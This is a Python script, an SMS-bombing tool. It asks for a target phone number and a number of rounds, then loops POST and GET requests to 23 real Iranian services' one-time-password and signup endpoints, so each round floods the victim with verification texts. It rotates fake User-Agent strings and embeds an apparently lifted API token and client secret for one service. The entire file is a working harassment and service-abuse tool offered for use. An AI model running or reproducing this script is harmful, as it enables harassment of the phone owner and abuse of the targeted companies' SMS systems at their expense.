import json
import requests
from fake_useragent import UserAgent
from time import sleep

fake = UserAgent()


headers = {'User-Agent':fake.random,'Pragma': 'no-cache', 'Accept': 'application/json'}



num = (input("Enter target number: "))
chanta = int(input("Enter round: "))
num0 = num[1:11]

url1 = "https://api.divar.ir/v5/auth/authenticate"
url1s = {"phone":num}

url2 = f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={num}"
url2s = {"cellphone": num}

url3 = f"https://core.gap.im/v1/user/add.json?mobile=%2B98{num0}"

url4 = "https://www.sheypoor.com/api/v10.0.0/auth/send"
url4s = {"username":"09915418996"}

url5 = "https://restaurant.delino.com/user/register"
url5s = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":num}

url6 = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
url6s = {"phoneNumber": num}

url7 = "https://pinket.com/api/cu/v2/phone-verification"
url7s = {"phoneNumber": num}

url8 = "https://app.itoll.com/api/v1/auth/login"
url8s = {"mobile": num}

url9 = "https://api.karnameh.com/v1/carinspection/auth/authenticate"
url9s = {"phone":num}

url10 = "https://auth.basalam.com/otp-request"
url10s = {"mobile": num, "client_id": 11}

url11 = "https://mobapi.banimode.com/api/v2/auth/request"
url11s = {"phone":num}

url12 = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}"
url12s = {"cellphone": num}

url13 = "https://www.mydigipay.com/digipay/api/users/send-sms"
url13s = {"cellNumber":num,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"Windows/Chrome","deviceAPI":"WEB_BROWSER","osName":"WEB"}}

url14 = "https://abantether.com/users/register/phone/send/"
url14s = {"phoneNumber": num, "email": ""}

url15 = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
url15s = {"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":"null","ApplicationVersion":"1.0.0","MobileNumber":num,"UniqueToken":"null"}}

url16 = "https://khodro45.com/api/v1/customers/otp/"
url16s = {"mobile":num}

url17 = "https://api.ostadkr.com/login"
url17s = {"mobile":num}

url18 = "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile"
url18s = {"mobile":num,"country_code":"98"}

url19 = "https://api.digikalajet.ir/user/login-register/"
url19s = {"phone": num}

url20 = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
url20s = {"phone":num}

url21 = "https://www.miare.ir/api/otp/client/request/"
url21s = {"phone_number":num}

url22 = "https://gw.taaghche.com/v4/site/auth/signup"
url22s = {"contact":num}

url23 = "https://taraazws.jabama.com/api/v4/account/send-code"
url23s = {"mobile":num}



for i in range(1, chanta + 1):
    number = i 
    res1 = requests.post(url=url1, json=url1s, headers=headers)
    res2 = requests.post(url=url2, json=url2s, headers=headers)
    res3 = requests.get(url=url3, headers=headers)
    res4 = requests.post(url=url4, json=url4s, headers=headers)
    res5 = requests.post(url=url5, json=url5s, headers=headers)
    res6 = requests.post(url=url6, json=url6s, headers=headers)
    res7 = requests.post(url=url7, json=url7s, headers=headers)
    res8 = requests.post(url=url8, json=url8s, headers=headers)
    res9 = requests.post(url=url9, json=url9s, headers=headers)
    res10 = requests.post(url=url10, json=url10s, headers=headers)
    res11 = requests.post(url=url11, json=url11s, headers=headers)
    res12 = requests.post(url=url12, json=url12s, headers=headers)
    res13 = requests.post(url=url13, json=url13s, headers=headers)
    res14 = requests.post(url=url14, json=url14s, headers=headers)
    res15 = requests.post(url=url15, json=url15s, headers=headers)
    res16 = requests.post(url=url16, json=url16s, headers=headers)
    res17 = requests.post(url=url17, json=url17s, headers=headers)
    res18 = requests.post(url=url18, json=url18s, headers=headers)
    res19 = requests.post(url=url19, json=url19s, headers=headers)
    res20 = requests.post(url=url20, data=url20s, headers=headers)
    res21 = requests.post(url=url21, data=url21s, headers=headers)
    res22 = requests.post(url=url22, json=url22s, headers=headers)
    res23 = requests.post(url=url23, json=url23s, headers=headers)
    print("Round", number,"complete")
sleep(10)